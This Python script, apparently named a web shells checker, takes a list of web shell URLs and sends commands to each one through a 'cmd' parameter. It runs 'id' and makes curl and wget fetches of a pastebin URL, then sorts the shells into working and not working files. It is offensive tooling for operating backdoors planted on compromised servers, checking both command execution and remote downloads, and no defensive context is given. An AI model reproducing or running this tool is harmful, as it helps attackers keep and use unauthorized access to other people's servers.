import argparse
import sys

import requests
import pandas

ascii_purple_color = "\x1b[38;5;13m"
ascii_green_color = "\x1b[32m"
ascii_red_color = "\x1b[1;31m"
reset_ascii_color = "\u001B[0m"

cmd_id = "id"
cmd_curl = "curl https://pastebin.com/raw/NYE0HT2k"
# this command checks could file be downloaded and redirects output to stdout without saving it
cmd_wget = "wget https://pastebin.com/raw/NYE0HT2k --output-document - | head -n1"
secret_message = "$2a$15$WNSlyUYj7TlpIXo.QAo/y.MTsitEwhm00gIIgHTJuc.GANQW9tgSC"
file_with_working_shells = "working.txt"
file_with_not_working_shells = "not_working.txt"


def parse_arguments():
    parser = argparse.ArgumentParser(description="Checks shell status")
    parser.add_argument('-l', help='Path to list with web shells', required=True)
    parser.format_help()
    args = parser.parse_args()
    if len(sys.argv) == 0 or args.l == '' or args is None:
        parser.print_help()
        sys.exit(1)
    if args.l.endswith('.txt'):
        check_status_txt_file(args.l)
    if args.l.endswith('.csv'):
        check_status_csv_file(args.l)


def check_status_txt_file(path):
    with (open(path) as txt_file):
        for line in txt_file:
            send_requests_and_check_responses(line)
    txt_file.close()


def check_status_csv_file(path):
    with (open(path, newline='') as csv_file):
        results = pandas.read_csv(csv_file, usecols=['url'])
        row_count = len(results)
        for index in range(row_count):
            line = results.__array__().item(index)
            send_requests_and_check_responses(line)
    csv_file.close()


def send_requests_and_check_responses(shell_url):
    with open(file_with_working_shells, 'w') as working_shells_file:
        with open(file_with_not_working_shells, 'w') as not_working_shells_file:
            print(ascii_green_color + "Checking shell: " + shell_url + reset_ascii_color)

            response_text_id = requests.get(shell_url + f"?cmd={cmd_id}", timeout=7000, verify=False).text
            response_text_curl = requests.get(shell_url + f"?cmd={cmd_curl}", timeout=7000, verify=False).text
            response_text_wget = requests.get(shell_url + f"?cmd={cmd_wget}", timeout=7000, verify=False).text

            contains_uid = response_text_id.find("uid")
            contains_wget_file = secret_message in response_text_wget
            contains_curl_file = secret_message in response_text_curl
            if contains_uid != -1 and contains_curl_file and contains_wget_file:

                response_status = requests.get(shell_url + "?cmd=id").status_code
                print(ascii_green_color + "Shell " + shell_url + " is alive." + "\n" +
                      "Status code: " + str(response_status))
                print("All necessary commands works." + reset_ascii_color)

                working_shells_file.write(shell_url + "\n")
            elif contains_uid != -1 or contains_curl_file or contains_wget_file:
                print(ascii_red_color + "Probably not all commands working" + reset_ascii_color)
                not_working_shells_file.write(shell_url + "\n")
            else:
                print(ascii_red_color + "Shell did not respond: " + shell_url + "\n" +
                      "Check path to shell " + reset_ascii_color)
                not_working_shells_file.write(shell_url + "\n")

    not_working_shells_file.close()
    working_shells_file.close()


def print_banner():
    print(ascii_purple_color)
    print(' .---------------------------------------------------------------.' + "\n"
          ' |      O                                                        |' + "\n"
          ' |      |                                                        |' + "\n"               
          ' |0{XXXX}+===================================================>   |' + "\n"  
          ' |      |                                                        |' + "\n"
          ' |      O                                                        |' + "\n"                                                                     
          ' |---------------------------------------------------------------|' + "\n"                                                                     
          ' | __        _______ ____    ____  _   _ _____ _     _     ____  |' + "\n"
          ' | \\ \\      / / ____| __ )  / ___|| | | | ____| |   | |   / ___| |' + "\n"
          ' |  \\ \\ /\\ / /|  _| |  _ \\  \\___ \\| |_| |  _| | |   | |   \\___ \\ |' + "\n"
          ' |   \\ V  V / | |___| |_) |  ___) |  _  | |___| |___| |___ ___) ||' + "\n"
          ' |   _\\_/\\_/  |_____|____/ _|____/|_| |_|_____|_____|_____|____/ |' + "\n"
          ' |  / ___| | | | ____/ ___| |/ / ____|  _ \\                      |' + "\n"
          " | | |   | |_| |  _|| |   | ' /|  _| | |_) |                     |" + "\n"
          ' | | |___|  _  | |__| |___| . \\| |___|  _ <                      |' + "\n"
          ' |  \\____|_| |_|_____\\____|_|\\_\\_____|_| \\_\\                     |' + "\n"
          ' |                                                               |' + "\n"
          " '---------------------------------------------------------------'")
    print(reset_ascii_color)


if __name__ == '__main__':
    print_banner()
    parse_arguments()
